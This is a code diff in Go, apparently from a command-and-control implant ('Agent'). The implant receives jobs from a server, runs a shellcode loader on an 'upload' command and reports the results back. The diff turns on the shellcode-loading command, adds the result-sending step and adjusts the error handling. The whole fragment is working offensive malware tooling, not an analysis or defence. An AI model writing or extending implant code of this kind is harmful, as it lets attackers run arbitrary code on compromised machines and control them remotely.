@@ -13,7 +13,7 @@ import (
 type OrchestratorFunc func(agent *Agent, job *models.ServerResponse) models.AgentTaskResult
 
 func registerCommands(agent *Agent) {
-	// agent.commandOrchestrators["upload"] = (*Agent).orchestrateLoad
+	agent.commandOrchestrators["upload"] = (*Agent).orchestrateLoad
 }
 
 func (agent *Agent) ExecuteTask(job *models.ServerResponse) {
@@ -40,6 +40,15 @@ func (agent *Agent) ExecuteTask(job *models.ServerResponse) {
 		log.Printf("|❗ERR AGENT TASK| Failed to marshal result for Task ID %s: %v", job.JobID, err)
 		return // Cannot send result if marshalling fails
 	}
+
+	// Now pass it to SendResult()
+	log.Printf("|AGENT TASK|-> Sending result for Task ID %s (%d bytes)...", job.JobID, len(resultBytes))
+	err = agent.SendResult(resultBytes)
+	if err != nil {
+		log.Printf("|❗ERR AGENT TASK| Failed to send result for Task ID %s: %v", job.JobID, err)
+	}
+
+	log.Printf("|AGENT TASK|-> Successfully sent result for Task ID %s.", job.JobID)
 
 }
 
@@ -103,18 +112,17 @@ func (agent *Agent) orchestrateLoad(job *models.ServerResponse) models.AgentTask
 
 	outputJSON, _ := json.Marshal(string(shellcodeResult.Message))
 
-	finalResult.Output = outputJSON
+	finalResult.CommandResult = outputJSON
 
 	if err != nil {
-		log.Printf("|❗ERR SHELLCODE ORCHESTRATOR| Loader execution error for TaskID %s: %v. Loader Message: %s",
-			task.TaskID, err, shellcodeResult.Message)
-		finalResult.Status = models.StatusFailureLoaderError
-		finalResult.Error = err.Error()
+		loaderError := fmt.Sprintf("|❗ERR SHELLCODE ORCHESTRATOR| Loader execution error for TaskID %s: %v. Loader Message: %s",
+			job.JobID, err, shellcodeResult.Message)
+		log.Printf(loaderError)
+		finalResult.Error = errors.New(loaderError)
 
 	} else {
 		log.Printf("|👊 SHELLCODE SUCCESS| Shellcode execution initiated successfully for TaskID %s. Loader Message: %s",
-			task.TaskID, shellcodeResult.Message)
-		finalResult.Status = models.StatusSuccessLaunched
+			job.JobID, shellcodeResult.Message)
 	}
 
 	return finalResult
